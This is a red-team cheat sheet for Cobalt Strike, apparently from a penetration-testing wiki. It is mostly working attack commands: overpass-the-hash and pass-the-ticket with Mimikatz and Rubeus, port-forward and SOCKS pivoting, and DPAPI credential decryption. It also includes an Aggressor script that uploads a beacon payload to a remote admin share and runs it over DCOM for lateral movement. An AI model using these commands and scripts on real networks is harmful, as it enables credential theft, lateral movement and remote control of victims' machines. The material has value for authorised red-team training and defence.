# Cobalt Strike

- [https://reconshell.com/list-of-awesome-cobaltstrike-resources/](https://reconshell.com/list-of-awesome-cobaltstrike-resources/)
- [https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)




## Malleable C2 Profiles

- [https://blog.zsec.uk/cobalt-strike-profiles/](https://blog.zsec.uk/cobalt-strike-profiles/)
- [https://github.com/rsmudge/Malleable-C2-Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)




## Aggressor Scripts

- [https://trial.cobaltstrike.com/aggressor-script/functions.html](https://trial.cobaltstrike.com/aggressor-script/functions.html)
- [https://chowdera.com/2021/02/20210204190220156W.html](https://chowdera.com/2021/02/20210204190220156W.html)




## P2P Beacons

Beacon TCP and Beacon SMB are Peer-to-Peer beacons which means they're used to chain a connection to an existent beacon. They act like bind shells and waits for the attacker to connect to them.

Connect to a TCP beacon:

```
beacon> connect <IP> <PORT>
```

Connect to an SMB beacon:

```
beacon> link <IP>
```




## Overpass-the-Hash

More opsec PtH than builtin `pth` command (which does the Mimikatz `sekurlsa::pth` thing with named pipe impersonation):

```
beacon> mimikatz sekurlsa::pth /user:snovvcrash /domain:megacorp.local /ntlm:fc525c9683e8fe067095ba2ddc971889
beacon> steal_token 1337
```

Same with Rubeus (must be in elevated context):

```
beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
beacon> steal_token 1337
```

Use Rubeus with lower privileges:

```
beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec

PS > [System.IO.File]::WriteAllBytes("C:\Windows\Tasks\tgt.kirbi", [System.Convert]::FromBase64String("<BASE64_TICKET>"))
Or
$ echo -en "<BASE64_TICKET>" | base64 -d > tgt.kirbi

beacon> run klist
Or
beacon> execute-assembly Rubeus.exe klist

beacon> make_token MEGACORP\snovvcrash dummy_Passw0rd!
beacon> kerberos_ticket_use C:\Windows\Tasks\tgt.kirbi
```




## Pass-the-Ticket

Create a sacrificial process, import the TGT into its logon session and steal its security token:

```
beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
beacon> execute-assembly Rubeus.exe ptt /luid:0x1337 /ticket:<BASE64_TICKET>
beacon> beacon> steal_token 1337
```




## Pivoting

Make any traffic hitting port **8443** on Victim to be redirected to **10.10.13.37** on port **443** (traffic flows through the Team Server):

```
beacon> rportfwd 8443 10.10.13.37 443
```

Make any traffic hitting port **8080** on Victim to be redirected to **localhost:8080** on Attacker (traffic flows through the CS client):

```
beacon> rportfwd_local 8080 127.0.0.1 80
```

Extending `jump` with [Invoke-DCOM.ps1](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/lateral_movement/Invoke-DCOM.ps1):

```powershell
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via this powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

Forward SOCKS server's port from team server to the client:

```
beacon> socks 1080
$ ssh -tt -v -L 9050:localhost:1080 root@teamserver
```




## Credentials



### DPAPI

List credential blobs:

```
beacon> ls C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials
```

List vault credentials:

```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> mimikatz vault::list
```

Check which master keys correspond to credential blobs (look for **guidMasterKey** field with GUID):

```
beacon> mimikatz dpapi::cred /in:C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\<BLOB>
```

The master key is stored here:

```
beacon> ls C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\<SID>
```

Decrypt the master key via RPC on the Domain Controller and show it:

```
beacon> mimikatz dpapi::masterkey /in:C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\<SID> /rpc
```

Decrypt the blob with decrypted master key:

```
beacon> mimikatz dpapi::cred /in:C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\<BLOB> /masterkey:<MASTERKEY>
```




## Evasion



### Sleep Mask

{% content-ref url="/pentest/infrastructure/ad/av-edr-evasion/maldev/code-injection/README.md#shellcode-in-memory-fluctuation" %}
[ntlmv1-downgrade.md](ntlmv1-downgrade.md)
{% endcontent-ref %}

- [https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/](https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/)
